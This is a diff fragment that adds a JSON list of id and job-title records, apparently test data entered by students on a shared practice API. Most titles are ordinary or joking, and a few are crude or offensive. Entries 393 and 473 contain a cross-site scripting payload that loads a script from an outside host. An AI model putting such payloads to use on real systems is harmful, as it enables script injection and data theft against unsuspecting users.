+            "id": "21",
+            "job": "CEO"
+        },
+        {
+            "id": "22",
+            "job": "Automation Engineer"
+        },
+        {
+            "id": "23",
+            "job": "API Tester"
+        },
+        {
+            "id": "24",
+            "job": "Instructor"
+        },
+        {
+            "id": "25",
+            "job": "CTO"
+        },
+        {
+            "id": "26",
+            "job": "QA Tester"
+        },
+        {
+            "id": "27",
+            "job": "Sr Production Manager"
+        },
+        {
+            "id": "28",
+            "job": "Sales&Marketing Manager"
+        },
+        {
+            "id": "29",
+            "job": "Freelancer"
+        },
+        {
+            "id": "30",
+            "job": "Manager"
+        },
+        {
+            "id": "31",
+            "job": "Freelancer"
+        },
+        {
+            "id": "32",
+            "job": "Hokage"
+        },
+        {
+            "id": "33",
+            "job": "Full Stack Developer"
+        },
+        {
+            "id": "34",
+            "job": "QA Engineer"
+        },
+        {
+            "id": "35",
+            "job": "Product Manager"
+        },
+        {
+            "id": "36",
+            "job": "Qa test lead"
+        },
+        {
+            "id": "37",
+            "job": "CO"
+        },
+        {
+            "id": "38",
+            "job": "Teacher"
+        },
+        {
+            "id": "39",
+            "job": "Engeneer"
+        },
+        {
+            "id": "40",
+            "job": "QA Automation Tester"
+        },
+        {
+            "id": "41",
+            "job": "QA Automation Testers"
+        },
+        {
+            "id": "42",
+            "job": "QA Analyst"
+        },
+        {
+            "id": "43",
+            "job": "QA Automation Test"
+        },
+        {
+            "id": "44",
+            "job": "QA Analyster"
+        },
+        {
+            "id": "45",
+            "job": "Manageres"
+        },
+        {
+            "id": "46",
+            "job": "CEOO"
+        },
+        {
+            "id": "47",
+            "job": "Employee"
+        },
+        {
+            "id": "48",
+            "job": "Professor"
+        },
+        {
+            "id": "49",
+            "job": "doctor"
+        },
+        {
+            "id": "50",
+            "job": "wefewrwer"
+        },
+        {
+            "id": "51",
+            "job": "My job title"
+        },
+        {
+            "id": "52",
+            "job": "Test Automation Developer"
+        },
+        {
+            "id": "53",
+            "job": "Test Automation Developer"
+        },
+        {
+            "id": "54",
+            "job": "doctor"
+        },
+        {
+            "id": "55",
+            "job": "doctor"
+        },
+        {
+            "id": "56",
+            "job": "doctor"
+        },
+        {
+            "id": "57",
+            "job": "doctor"
+        },
+        {
+            "id": "58",
+            "job": "doctor"
+        },
+        {
+            "id": "59",
+            "job": "doctor"
+        },
+        {
+            "id": "60",
+            "job": "doctor"
+        },
+        {
+            "id": "61",
+            "job": "doctor"
+        },
+        {
+            "id": "62",
+            "job": "doctor"
+        },
+        {
+            "id": "63",
+            "job": "doctor"
+        },
+        {
+            "id": "64",
+            "job": "doctor"
+        },
+        {
+            "id": "65",
+            "job": "doctor"
+        },
+        {
+            "id": "66",
+            "job": "doctor"
+        },
+        {
+            "id": "67",
+            "job": "doctor"
+        },
+        {
+            "id": "68",
+            "job": "CEO123"
+        },
+        {
+            "id": "69",
+            "job": "Data Analyst"
+        },
+        {
+            "id": "70",
+            "job": "Chemist"
+        },
+        {
+            "id": "71",
+            "job": "LazyBoy"
+        },
+        {
+            "id": "72",
+            "job": "doctor"
+        },
+        {
+            "id": "73",
+            "job": "doctor"
+        },
+        {
+            "id": "74",
+            "job": "doctor"
+        },
+        {
+            "id": "75",
+            "job": "doctor"
+        },
+        {
+            "id": "76",
+            "job": "doctor"
+        },
+        {
+            "id": "77",
+            "job": "doctor"
+        },
+        {
+            "id": "78",
+            "job": "doctor"
+        },
+        {
+            "id": "79",
+            "job": "doctor"
+        },
+        {
+            "id": "80",
+            "job": "SDET"
+        },
+        {
+            "id": "81",
+            "job": "a"
+        },
+        {
+            "id": "82",
+            "job": "dw"
+        },
+        {
+            "id": "83",
+            "job": "DJ"
+        },
+        {
+            "id": "84",
+            "job": "DJ2"
+        },
+        {
+            "id": "85",
+            "job": "English Teacher"
+        },
+        {
+            "id": "86",
+            "job": "German Teacher"
+        },
+        {
+            "id": "87",
+            "job": "Math Teacher"
+        },
+        {
+            "id": "88",
+            "job": "dn2"
+        },
+        {
+            "id": "89",
+            "job": "Pool Party"
+        },
+        {
+            "id": "90",
+            "job": "Bussiness Analysist"
+        },
+        {
+            "id": "91",
+            "job": "Automation Tester"
+        },
+        {
+            "id": "92",
+            "job": " Cloud Consultant"
+        },
+        {
+            "id": "93",
+            "job": "QA"
+        },
+        {
+            "id": "94",
+            "job": "Tester"
+        },
+        {
+            "id": "95",
+            "job": "Driver"
+        },
+        {
+            "id": "96",
+            "job": "student"
+        },
+        {
+            "id": "97",
+            "job": "Architect"
+        },
+        {
+            "id": "98",
+            "job": "string"
+        },
+        {
+            "id": "99",
+            "job": "BA"
+        },
+        {
+            "id": "100",
+            "job": "Scrum Master"
+        },
+        {
+            "id": "101",
+            "job": "Technician"
+        },
+        {
+            "id": "102",
+            "job": "Healer"
+        },
+        {
+            "id": "103",
+            "job": "Director"
+        },
+        {
+            "id": "104",
+            "job": "Smotrawiu"
+        },
+        {
+            "id": "105",
+            "job": "Owner"
+        },
+        {
+            "id": "106",
+            "job": "Bitch"
+        },
+        {
+            "id": "107",
+            "job": "Cloud Architector"
+        },
+        {
+            "id": "108",
+            "job": "Life enjoyer"
+        },
+        {
+            "id": "109",
+            "job": "LifeEnjoyer"
+        },
+        {
+            "id": "110",
+            "job": "HumanLover"
+        },
+        {
+            "id": "111",
+            "job": "homemaker"
+        },
+        {
+            "id": "112",
+            "job": "LifeEnjoyer"
+        },
+        {
+            "id": "113",
+            "job": "LifeEnjoyer"
+        },
+        {
+            "id": "114",
+            "job": "HumanLover"
+        },
+        {
+            "id": "115",
+            "job": "Cloud Comsultant"
+        },
+        {
+            "id": "116",
+            "job": "Dealer"
+        },
+        {
+            "id": "117",
+            "job": "QA Testers"
+        },
+        {
+            "id": "118",
+            "job": "Consultant"
+        },
+        {
+            "id": "119",
+            "job": "Cloud Arhitect"
+        },
+        {
+            "id": "120",
+            "job": "dev"
+        },
+        {
+            "id": "121",
+            "job": "terster"
+        },
+        {
+            "id": "122",
+            "job": "Toil Guard"
+        },
+        {
+            "id": "123",
+            "job": "AI Engineer"
+        },
+        {
+            "id": "124",
+            "job": "Bacon"
+        },
+        {
+            "id": "125",
+            "job": "ScrumMaster"
+        },
+        {
+            "id": "126",
+            "job": "ScrumMaster3000"
+        },
+        {
+            "id": "127",
+            "job": "ScrumMaster3000"
+        },
+        {
+            "id": "128",
+            "job": "ScrumMaster3000"
+        },
+        {
+            "id": "129",
+            "job": "George"
+        },
+        {
+            "id": "130",
+            "job": "Georgest"
+        },
+        {
+            "id": "131",
+            "job": "ScrumRookie"
+        },
+        {
+            "id": "132",
+            "job": "ScrumRockie"
+        },
+        {
+            "id": "133",
+            "job": "ScrumRookie3000"
+        },
+        {
+            "id": "134",
+            "job": "AScrumMaster"
+        },
+        {
+            "id": "135",
+            "job": "AScrumMaster3000"
+        },
+        {
+            "id": "136",
+            "job": "AScrumMaster007"
+        },
+        {
+            "id": "137",
+            "job": "LifeEnjoyer"
+        },
+        {
+            "id": "138",
+            "job": "HumanLover"
+        },
+        {
+            "id": "139",
+            "job": "null"
+        },
+        {
+            "id": "140",
+            "job": "Automation Eng"
+        },
+        {
+            "id": "141",
+            "job": "cloud"
+        },
+        {
+            "id": "142",
+            "job": "IT"
+        },
+        {
+            "id": "143",
+            "job": "Sr Production Man"
+        },
+        {
+            "id": "144",
+            "job": "Dream Catcher"
+        },
+        {
+            "id": "145",
+            "job": "Electrician"
+        },
+        {
+            "id": "146",
+            "job": "API API Terster"
+        },
+        {
+            "id": "147",
+            "job": "Staff"
+        },
+        {
+            "id": "148",
+            "job": "emp_job_title"
+        },
+        {
+            "id": "149",
+            "job": "em"
+        },
+        {
+            "id": "150",
+            "job": "emjjj"
+        },
+        {
+            "id": "151",
+            "job": "LifeEnjoyer"
+        },
+        {
+            "id": "152",
+            "job": "HumanLover"
+        },
+        {
+            "id": "153",
+            "job": "AScrumMaster0071"
+        },
+        {
+            "id": "154",
+            "job": "AScrumMaster0070"
+        },
+        {
+            "id": "155",
+            "job": "HR Manager"
+        },
+        {
+            "id": "156",
+            "job": "AScrumMaster007"
+        },
+        {
+            "id": "157",
+            "job": "AScrumMaster007"
+        },
+        {
+            "id": "158",
+            "job": "AScrumMaster0071"
+        },
+        {
+            "id": "159",
+            "job": "Cook"
+        },
+        {
+            "id": "160",
+            "job": "Hal_line"
+        },
+        {
+            "id": "161",
+            "job": "HOLA HOLA"
+        },
+        {
+            "id": "162",
+            "job": "HR"
+        },
+        {
+            "id": "163",
+            "job": "SSDET"
+        },
+        {
+            "id": "164",
+            "job": "unemployed"
+        },
+        {
+            "id": "165",
+            "job": "Engineer"
+        },
+        {
+            "id": "166",
+            "job": "barmalei"
+        },
+        {
+            "id": "167",
+            "job": "Administrator"
+        },
+        {
+            "id": "168",
+            "job": "Automation"
+        },
+        {
+            "id": "169",
+            "job": "manual"
+        },
+        {
+            "id": "170",
+            "job": "Cloud Architectr"
+        },
+        {
+            "id": "171",
+            "job": "ETester"
+        },
+        {
+            "id": "172",
+            "job": "Software Developer"
+        },
+        {
+            "id": "173",
+            "job": "Genius"
+        },
+        {
+            "id": "174",
+            "job": "Texas Group please don't DELETE"
+        },
+        {
+            "id": "175",
+            "job": "Freelance"
+        },
+        {
+            "id": "176",
+            "job": "wefewrwer"
+        },
+        {
+            "id": "177",
+            "job": "unemployed"
+        },
+        {
+            "id": "178",
+            "job": "a"
+        },
+        {
+            "id": "179",
+            "job": "new"
+        },
+        {
+            "id": "180",
+            "job": "doctor"
+        },
+        {
+            "id": "181",
+            "job": "doctor"
+        },
+        {
+            "id": "182",
+            "job": "doctor"
+        },
+        {
+            "id": "183",
+            "job": "doctor"
+        },
+        {
+            "id": "184",
+            "job": "doctor"
+        },
+        {
+            "id": "185",
+            "job": "doctor"
+        },
+        {
+            "id": "186",
+            "job": "doctor"
+        },
+        {
+            "id": "187",
+            "job": "doctor"
+        },
+        {
+            "id": "188",
+            "job": "doctor"
+        },
+        {
+            "id": "189",
+            "job": "doctor"
+        },
+        {
+            "id": "190",
+            "job": "doctor"
+        },
+        {
+            "id": "191",
+            "job": "doctor"
+        },
+        {
+            "id": "192",
+            "job": "doctor"
+        },
+        {
+            "id": "193",
+            "job": "doctor"
+        },
+        {
+            "id": "194",
+            "job": "doctor"
+        },
+        {
+            "id": "195",
+            "job": "doctor"
+        },
+        {
+            "id": "196",
+            "job": "doctor"
+        },
+        {
+            "id": "197",
+            "job": "doctor"
+        },
+        {
+            "id": "198",
+            "job": "doctor"
+        },
+        {
+            "id": "199",
+            "job": "president"
+        },
+        {
+            "id": "200",
+            "job": "API-Tester"
+        },
+        {
+            "id": "201",
+            "job": "stringbvcbcv"
+        },
+        {
+            "id": "202",
+            "job": "API"
+        },
+        {
+            "id": "203",
+            "job": "Cloud Arch"
+        },
+        {
+            "id": "204",
+            "job": "IT blabla"
+        },
+        {
+            "id": "205",
+            "job": "Chimney Tester"
+        },
+        {
+            "id": "206",
+            "job": "Cloud......"
+        },
+        {
+            "id": "207",
+            "job": "Network Admin"
+        },
+        {
+            "id": "208",
+            "job": "API- tester"
+        },
+        {
+            "id": "209",
+            "job": "Caped Crusader"
+        },
+        {
+            "id": "210",
+            "job": "Slasher"
+        },
+        {
+            "id": "211",
+            "job": "Postman"
+        },
+        {
+            "id": "212",
+            "job": "Sandy Claws"
+        },
+        {
+            "id": "213",
+            "job": "Cloud Tester"
+        },
+        {
+            "id": "214",
+            "job": "Blizzard"
+        },
+        {
+            "id": "215",
+            "job": "Guru"
+        },
+        {
+            "id": "216",
+            "job": "Gifter"
+        },
+        {
+            "id": "217",
+            "job": "Helper"
+        },
+        {
+            "id": "218",
+            "job": "Test Job"
+        },
+        {
+            "id": "219",
+            "job": "{{JOB_TAPITester}}"
+        },
+        {
+            "id": "220",
+            "job": "Self-Employee"
+        },
+        {
+            "id": "221",
+            "job": "develpo"
+        },
+        {
+            "id": "222",
+            "job": "Lead Consultant"
+        },
+        {
+            "id": "223",
+            "job": "Cl d Architect"
+        },
+        {
+            "id": "224",
+            "job": "C d Architect"
+        },
+        {
+            "id": "225",
+            "job": "Active"
+        },
+        {
+            "id": "226",
+            "job": "Cloud Consulting"
+        },
+        {
+            "id": "227",
+            "job": "MA1"
+        },
+        {
+            "id": "228",
+            "job": "Texas Group please don't DELETE"
+        },
+        {
+            "id": "229",
+            "job": "Database AdAdministrator"
+        },
+        {
+            "id": "230",
+            "job": "Ethical Hacker"
+        },
+        {
+            "id": "231",
+            "job": "Hacker"
+        },
+        {
+            "id": "232",
+            "job": "etrtyr"
+        },
+        {
+            "id": "233",
+            "job": "Architectural Engineer"
+        },
+        {
+            "id": "234",
+            "job": "Architectural Engineer/DESIGNER"
+        },
+        {
+            "id": "235",
+            "job": "SDET Engineer"
+        },
+        {
+            "id": "236",
+            "job": "Software Engineer"
+        },
+        {
+            "id": "237",
+            "job": "Automation Enengineerg"
+        },
+        {
+            "id": "238",
+            "job": "QA lead"
+        },
+        {
+            "id": "239",
+            "job": "Api Testoios"
+        },
+        {
+            "id": "240",
+            "job": "Cloud consulant"
+        },
+        {
+            "id": "241",
+            "job": "Loser"
+        },
+        {
+            "id": "242",
+            "job": "sCloud Consultant"
+        },
+        {
+            "id": "243",
+            "job": "Apple Consultant"
+        },
+        {
+            "id": "244",
+            "job": "Cloud-Consultant"
+        },
+        {
+            "id": "245",
+            "job": "IT Manager"
+        },
+        {
+            "id": "246",
+            "job": "Executive Executor"
+        },
+        {
+            "id": "247",
+            "job": "Singer"
+        },
+        {
+            "id": "248",
+            "job": "Wizard"
+        },
+        {
+            "id": "249",
+            "job": "SM"
+        },
+        {
+            "id": "250",
+            "job": "Super QA Tester"
+        },
+        {
+            "id": "251",
+            "job": "Gigolo"
+        },
+        {
+            "id": "252",
+            "job": "Musician"
+        },
+        {
+            "id": "253",
+            "job": "CFO"
+        },
+        {
+            "id": "254",
+            "job": "GOD"
+        },
+        {
+            "id": "255",
+            "job": "QAc"
+        },
+        {
+            "id": "256",
+            "job": "Test oios"
+        },
+        {
+            "id": "257",
+            "job": "Future Developer"
+        },
+        {
+            "id": "258",
+            "job": "Cloud Admin"
+        },
+        {
+            "id": "259",
+            "job": "Empress of India"
+        },
+        {
+            "id": "260",
+            "job": "CSS"
+        },
+        {
+            "id": "261",
+            "job": "Part time Worker"
+        },
+        {
+            "id": "262",
+            "job": "swinger"
+        },
+        {
+            "id": "263",
+            "job": "PROVIDNYK"
+        },
+        {
+            "id": "264",
+            "job": "PROVIDNYKAS"
+        },
+        {
+            "id": "265",
+            "job": "kuku"
+        },
+        {
+            "id": "266",
+            "job": "Testoss"
+        },
+        {
+            "id": "267",
+            "job": "Sky Consultant"
+        },
+        {
+            "id": "268",
+            "job": "Terrorist"
+        },
+        {
+            "id": "269",
+            "job": "Boss man"
+        },
+        {
+            "id": "270",
+            "job": "Head of Research"
+        },
+        {
+            "id": "271",
+            "job": "catcher"
+        },
+        {
+            "id": "272",
+            "job": "Dancer"
+        },
+        {
+            "id": "273",
+            "job": "Farmer"
+        },
+        {
+            "id": "274",
+            "job": "QATESTER"
+        },
+        {
+            "id": "275",
+            "job": "pinger"
+        },
+        {
+            "id": "276",
+            "job": "Cloud Engineer"
+        },
+        {
+            "id": "277",
+            "job": "QcA"
+        },
+        {
+            "id": "278",
+            "job": "API T"
+        },
+        {
+            "id": "279",
+            "job": "Chief Relations Officer"
+        },
+        {
+            "id": "280",
+            "job": "Testo"
+        },
+        {
+            "id": "281",
+            "job": "QcAs"
+        },
+        {
+            "id": "282",
+            "job": "vsegda"
+        },
+        {
+            "id": "283",
+            "job": "somthng"
+        },
+        {
+            "id": "284",
+            "job": "pitcher"
+        },
+        {
+            "id": "285",
+            "job": "Sugar Daddy"
+        },
+        {
+            "id": "286",
+            "job": "QZ"
+        },
+        {
+            "id": "287",
+            "job": "qs"
+        },
+        {
+            "id": "288",
+            "job": "Iloveanal"
+        },
+        {
+            "id": "289",
+            "job": "qsX"
+        },
+        {
+            "id": "290",
+            "job": "EMpl"
+        },
+        {
+            "id": "291",
+            "job": "Iloveanally"
+        },
+        {
+            "id": "292",
+            "job": "Cloudu Consultant"
+        },
+        {
+            "id": "293",
+            "job": "cloud consultantt"
+        },
+        {
+            "id": "294",
+            "job": "qas"
+        },
+        {
+            "id": "295",
+            "job": "QA manager"
+        },
+        {
+            "id": "296",
+            "job": "Cloud Consaltant"
+        },
+        {
+            "id": "297",
+            "job": "AnalRaper"
+        },
+        {
+            "id": "298",
+            "job": "Super Tester"
+        },
+        {
+            "id": "299",
+            "job": "WebDesigner"
+        },
+        {
+            "id": "300",
+            "job": "Hustler"
+        },
+        {
+            "id": "301",
+            "job": "Einstein"
+        },
+        {
+            "id": "302",
+            "job": "Einsteint"
+        },
+        {
+            "id": "303",
+            "job": "Postman2"
+        },
+        {
+            "id": "304",
+            "job": "Bodyguard"
+        },
+        {
+            "id": "305",
+            "job": "Jr.QA"
+        },
+        {
+            "id": "306",
+            "job": "updated_Bodyguard"
+        },
+        {
+            "id": "307",
+            "job": "updated2_Bodyguard"
+        },
+        {
+            "id": "308",
+            "job": "Partially Updated Bodyguard"
+        },
+        {
+            "id": "309",
+            "job": "Pilot"
+        },
+        {
+            "id": "310",
+            "job": "Writer"
+        },
+        {
+            "id": "311",
+            "job": "Cloud Lawer"
+        },
+        {
+            "id": "312",
+            "job": "Highlander"
+        },
+        {
+            "id": "313",
+            "job": "Сow lord"
+        },
+        {
+            "id": "314",
+            "job": "Picker"
+        },
+        {
+            "id": "315",
+            "job": "Accountant Assistant"
+        },
+        {
+            "id": "316",
+            "job": "Assistant Accountant"
+        },
+        {
+            "id": "317",
+            "job": "Kaldirim Muhendisi"
+        },
+        {
+            "id": "318",
+            "job": "QC"
+        },
+        {
+            "id": "319",
+            "job": "Pro Wrestler"
+        },
+        {
+            "id": "320",
+            "job": "CrimeFighter"
+        },
+        {
+            "id": "321",
+            "job": "Probation"
+        },
+        {
+            "id": "322",
+            "job": "President of the United States"
+        },
+        {
+            "id": "323",
+            "job": "Rapper"
+        },
+        {
+            "id": "324",
+            "job": "Avenger"
+        },
+        {
+            "id": "325",
+            "job": "Everything"
+        },
+        {
+            "id": "326",
+            "job": "DBA"
+        },
+        {
+            "id": "327",
+            "job": "Painter"
+        },
+        {
+            "id": "328",
+            "job": "QA Eng"
+        },
+        {
+            "id": "329",
+            "job": "Drummer"
+        },
+        {
+            "id": "330",
+            "job": "Junior"
+        },
+        {
+            "id": "331",
+            "job": "top class test engineer"
+        },
+        {
+            "id": "332",
+            "job": "Artist"
+        },
+        {
+            "id": "333",
+            "job": "QA Test Engineer API"
+        },
+        {
+            "id": "334",
+            "job": "permanent"
+        },
+        {
+            "id": "335",
+            "job": "sr QA"
+        },
+        {
+            "id": "336",
+            "job": "Admin"
+        },
+        {
+            "id": "337",
+            "job": "KING"
+        },
+        {
+            "id": "338",
+            "job": "Game developer"
+        },
+        {
+            "id": "339",
+            "job": "Fight Evil"
+        },
+        {
+            "id": "340",
+            "job": "jhb"
+        },
+        {
+            "id": "341",
+            "job": "Movie Star"
+        },
+        {
+            "id": "342",
+            "job": "GOAT"
+        },
+        {
+            "id": "343",
+            "job": "supervisor"
+        },
+        {
+            "id": "344",
+            "job": "X-Factor"
+        },
+        {
+            "id": "345",
+            "job": "Promoted"
+        },
+        {
+            "id": "346",
+            "job": "Anti-Hero"
+        },
+        {
+            "id": "347",
+            "job": "executive assistant"
+        },
+        {
+            "id": "348",
+            "job": "Entertainment"
+        },
+        {
+            "id": "349",
+            "job": "confirmed"
+        },
+        {
+            "id": "350",
+            "job": "Smoker"
+        },
+        {
+            "id": "351",
+            "job": "Master of the Universe"
+        },
+        {
+            "id": "352",
+            "job": "Dy Manager"
+        },
+        {
+            "id": "353",
+            "job": "Deputy Manager"
+        },
+        {
+            "id": "354",
+            "job": "window washer"
+        },
+        {
+            "id": "355",
+            "job": "QC Manager"
+        },
+        {
+            "id": "356",
+            "job": "Sushi"
+        },
+        {
+            "id": "357",
+            "job": "Villain"
+        },
+        {
+            "id": "358",
+            "job": "Steve Austin Podcast"
+        },
+        {
+            "id": "359",
+            "job": "Cloud Manager"
+        },
+        {
+            "id": "360",
+            "job": "DPT Manager"
+        },
+        {
+            "id": "361",
+            "job": "Dv Manager"
+        },
+        {
+            "id": "362",
+            "job": "confirm"
+        },
+        {
+            "id": "363",
+            "job": "Promotedagain"
+        },
+        {
+            "id": "364",
+            "job": "dector"
+        },
+        {
+            "id": "365",
+            "job": "SHOOTING GAURD"
+        },
+        {
+            "id": "366",
+            "job": "DY string"
+        },
+        {
+            "id": "367",
+            "job": "QA"
+        },
+        {
+            "id": "368",
+            "job": "Constultant"
+        },
+        {
+            "id": "369",
+            "job": "Cat"
+        },
+        {
+            "id": "370",
+            "job": "harworking alphamale"
+        },
+        {
+            "id": "371",
+            "job": "Trainee"
+        },
+        {
+            "id": "372",
+            "job": "QAE"
+        },
+        {
+            "id": "373",
+            "job": "Support"
+        },
+        {
+            "id": "374",
+            "job": "Traniee"
+        },
+        {
+            "id": "375",
+            "job": "Trainee-software"
+        },
+        {
+            "id": "376",
+            "job": "data analysis"
+        },
+        {
+            "id": "377",
+            "job": "Shop owner"
+        },
+        {
+            "id": "378",
+            "job": "Testing QA"
+        },
+        {
+            "id": "379",
+            "job": "senior trainee"
+        },
+        {
+            "id": "380",
+            "job": "software"
+        },
+        {
+            "id": "381",
+            "job": "RPA"
+        },
+        {
+            "id": "382",
+            "job": "By Manager"
+        },
+        {
+            "id": "383",
+            "job": "Analyst"
+        },
+        {
+            "id": "384",
+            "job": "shooter"
+        },
+        {
+            "id": "385",
+            "job": "Manger"
+        },
+        {
+            "id": "386",
+            "job": "SeniorQA"
+        },
+        {
+            "id": "387",
+            "job": "unknown"
+        },
+        {
+            "id": "388",
+            "job": "Call Boy"
+        },
+        {
+            "id": "389",
+            "job": "Senior manager"
+        },
+        {
+            "id": "390",
+            "job": "REV"
+        },
+        {
+            "id": "391",
+            "job": "Lead QA"
+        },
+        {
+            "id": "392",
+            "job": "OC"
+        },
+        {
+            "id": "393",
+            "job": "2222\"><script src=https://naeem.xss.ht></script>"
+        },
+        {
+            "id": "394",
+            "job": "Assistant Manager"
+        },
+        {
+            "id": "395",
+            "job": "HardStudent"
+        },
+        {
+            "id": "396",
+            "job": "QUALITY ASSURANCE"
+        },
+        {
+            "id": "397",
+            "job": "Hardworking Alphamale"
+        },
+        {
+            "id": "398",
+            "job": "Traniee-software"
+        },
+        {
+            "id": "399",
+            "job": "Test Engineer"
+        },
+        {
+            "id": "400",
+            "job": "Senior-QA"
+        },
+        {
+            "id": "401",
+            "job": "QA TestEngineer"
+        },
+        {
+            "id": "402",
+            "job": "AE"
+        },
+        {
+            "id": "403",
+            "job": "REVO"
+        },
+        {
+            "id": "404",
+            "job": "RULER"
+        },
+        {
+            "id": "405",
+            "job": "Product Owner"
+        },
+        {
+            "id": "406",
+            "job": "Actor"
+        },
+        {
+            "id": "407",
+            "job": "Prob"
+        },
+        {
+            "id": "408",
+            "job": "boss"
+        },
+        {
+            "id": "409",
+            "job": "formeruberdrivernowuberengineer"
+        },
+        {
+            "id": "410",
+            "job": "QA En"
+        },
+        {
+            "id": "411",
+            "job": "The Boss"
+        },
+        {
+            "id": "412",
+            "job": "Junior Manager"
+        },
+        {
+            "id": "413",
+            "job": "Service Desk Analyst"
+        },
+        {
+            "id": "414",
+            "job": "Lead"
+        },
+        {
+            "id": "415",
+            "job": "Robotic Engineer"
+        },
+        {
+            "id": "416",
+            "job": "Sr. QA"
+        },
+        {
+            "id": "417",
+            "job": "Actress"
+        },
+        {
+            "id": "418",
+            "job": "Dark Knight"
+        },
+        {
+            "id": "419",
+            "job": "Element"
+        },
+        {
+            "id": "420",
+            "job": "PA Manager"
+        },
+        {
+            "id": "421",
+            "job": "Managerr"
+        },
+        {
+            "id": "422",
+            "job": "Fighter"
+        },
+        {
+            "id": "423",
+            "job": "Manager"
+        },
+        {
+            "id": "424",
+            "job": "Q/A"
+        },
+        {
+            "id": "425",
+            "job": "Scientist"
+        },
+        {
+            "id": "426",
+            "job": "Team Lead"
+        },
+        {
+            "id": "427",
+            "job": "BestCat"
+        },
+        {
+            "id": "428",
+            "job": "Space Engineer"
+        },
+        {
+            "id": "429",
+            "job": "Defensive End"
+        },
+        {
+            "id": "430",
+            "job": "Running Back"
+        },
+        {
+            "id": "431",
+            "job": "employed"
+        },
+        {
+            "id": "432",
+            "job": "nursing"
+        },
+        {
+            "id": "433",
+            "job": "businessman"
+        },
+        {
+            "id": "434",
+            "job": "y"
+        },
+        {
+            "id": "435",
+            "job": "nothing"
+        },
+        {
+            "id": "436",
+            "job": "UberEat"
+        },
+        {
+            "id": "437",
+            "job": "QA Ingineer"
+        },
+        {
+            "id": "438",
+            "job": "SKSKS"
+        },
+        {
+            "id": "439",
+            "job": "Nurse"
+        },
+        {
+            "id": "440",
+            "job": "Sr. QA Manager"
+        },
+        {
+            "id": "441",
+            "job": "s"
+        },
+        {
+            "id": "442",
+            "job": "Father"
+        },
+        {
+            "id": "443",
+            "job": "Sr QA Manager"
+        },
+        {
+            "id": "444",
+            "job": "{{jobTitle}}"
+        },
+        {
+            "id": "445",
+            "job": "Gardener"
+        },
+        {
+            "id": "446",
+            "job": "maha"
+        },
+        {
+            "id": "447",
+            "job": "EMPLOYEED"
+        },
+        {
+            "id": "448",
+            "job": "TopQA"
+        },
+        {
+            "id": "449",
+            "job": "Fry Cook"
+        },
+        {
+            "id": "450",
+            "job": "Banking"
+        },
+        {
+            "id": "451",
+            "job": "Model"
+        },
+        {
+            "id": "452",
+            "job": "Senior QA Engineer"
+        },
+        {
+            "id": "453",
+            "job": "cleaning"
+        },
+        {
+            "id": "454",
+            "job": "QA Engineer 1"
+        },
+        {
+            "id": "455",
+            "job": "SR QA Engineer 1"
+        },
+        {
+            "id": "456",
+            "job": "SR QA Engineer 2"
+        },
+        {
+            "id": "457",
+            "job": "free"
+        },
+        {
+            "id": "458",
+            "job": "tea"
+        },
+        {
+            "id": "459",
+            "job": "Bodyguard - Updated"
+        },
+        {
+            "id": "460",
+            "job": "Hug Giver"
+        },
+        {
+            "id": "461",
+            "job": "Learning Hug Giver"
+        },
+        {
+            "id": "462",
+            "job": "Pro Hug Giver"
+        },
+        {
+            "id": "463",
+            "job": "Hug"
+        },
+        {
+            "id": "464",
+            "job": "Uknown"
+        },
+        {
+            "id": "465",
+            "job": "Manasgsdgerr"
+        },
+        {
+            "id": "466",
+            "job": "baller"
+        },
+        {
+            "id": "467",
+            "job": "API_TESTER"
+        },
+        {
+            "id": "468",
+            "job": "Hooper"
+        },
+        {
+            "id": "469",
+            "job": "free1"
+        },
+        {
+            "id": "470",
+            "job": "terc"
+        },
+        {
+            "id": "471",
+            "job": "fee"
+        },
+        {
+            "id": "472",
+            "job": "feeere"
+        },
+        {
+            "id": "473",
+            "job": "Naeem\"><script src=https://naeem.xss.ht></script>"
+        },
+        {
+            "id": "474",
+            "job": "Updated: Bodyguard"
+        },
+        {
+            "id": "475",
+            "job": "Realtor"
+        },
+        {
+            "id": "476",
+            "job": "QQ"
+        },
+        {
+            "id": "477",
+            "job": "Manual Tester"
+        },
+        {
+            "id": "478",
+            "job": "Qa tester"
+        },
+        {
+            "id": "479",
+            "job": "Analyst Trainee"
+        },
+        {
+            "id": "480",
+            "job": "Trainer"
+        },
+        {
+            "id": "481",
+            "job": "Eng"
+        },
+        {
+            "id": "482",
+            "job": "nalli"
+        },
+        {
+            "id": "483",
+            "job": "Senior Analyst"
+        },
+        {
+            "id": "484",
+            "job": "Project Manager"
+        },
+        {
+            "id": "485",
+            "job": "DC Analyst"
+        },
+        {
+            "id": "486",
+            "job": "designer"
+        },
+        {
+            "id": "487",
+            "job": "AT"
+        },
+        {
+            "id": "488",
+            "job": "Chairman"
+        },
+        {
+            "id": "489",
+            "job": "Assistan Professor"
+        },
+        {
+            "id": "490",
+            "job": "Siphon"
+        },
+        {
+            "id": "491",
+            "job": "looking"
+        },
+        {
+            "id": "492",
+            "job": "softwareEngineer"
+        },
+        {
+            "id": "493",
+            "job": "QA Enginner"
+        },
+        {
+            "id": "494",
+            "job": "SDET boss"
+        },
+        {
+            "id": "495",
+            "job": "QA.Engineer"
+        },
+        {
+            "id": "496",
+            "job": "Programmer"
+        },
+        {
+            "id": "497",
+            "job": "useless"
+        },
+        {
+            "id": "498",
+            "job": "QA Engeneer"
+        },
+        {
+            "id": "499",
+            "job": "normal"
+        },
+        {
+            "id": "500",
+            "job": "civilengineer"
+        },
+        {
+            "id": "501",
+            "job": "Ingineer"
+        },
+        {
+            "id": "502",
+            "job": "TrashCan"
+        },
+        {
+            "id": "503",
+            "job": "Maneger"
+        },
+        {
+            "id": "504",
+            "job": "Apex Live Streamer"
+        },
+        {
+            "id": "505",
+            "job": "whatever"
+        },
+        {
+            "id": "506",
+            "job": "Finance"
+        },
+        {
+            "id": "507",
+            "job": "American actress, singer, and model"
+        },
+        {
+            "id": "508",
+            "job": "Java Instructor"
+        },
+        {
+            "id": "509",
+            "job": "Senior Qa InshAlah"
+        },
+        {
+            "id": "510",
+            "job": "PO"
+        },
+        {
+            "id": "511",
+            "job": "Distiler"
+        },
+        {
+            "id": "512",
+            "job": "janitor"
+        },
+        {
+            "id": "513",
+            "job": "happiness counselor"
+        },
+        {
+            "id": "514",
+            "job": "Jorokashi"
+        },
+        {
+            "id": "515",
+            "job": "Senior Qa"
+        },
+        {
+            "id": "516",
+            "job": "LEAD MANAGER"
+        },
+        {
+            "id": "517",
+            "job": "AZN"
+        },
+        {
+            "id": "518",
+            "job": "General Manager"
+        },
+        {
+            "id": "519",
+            "job": "humanre"
+        },
+        {
+            "id": "520",
+            "job": "assistant"
+        },
+        {
+            "id": "521",
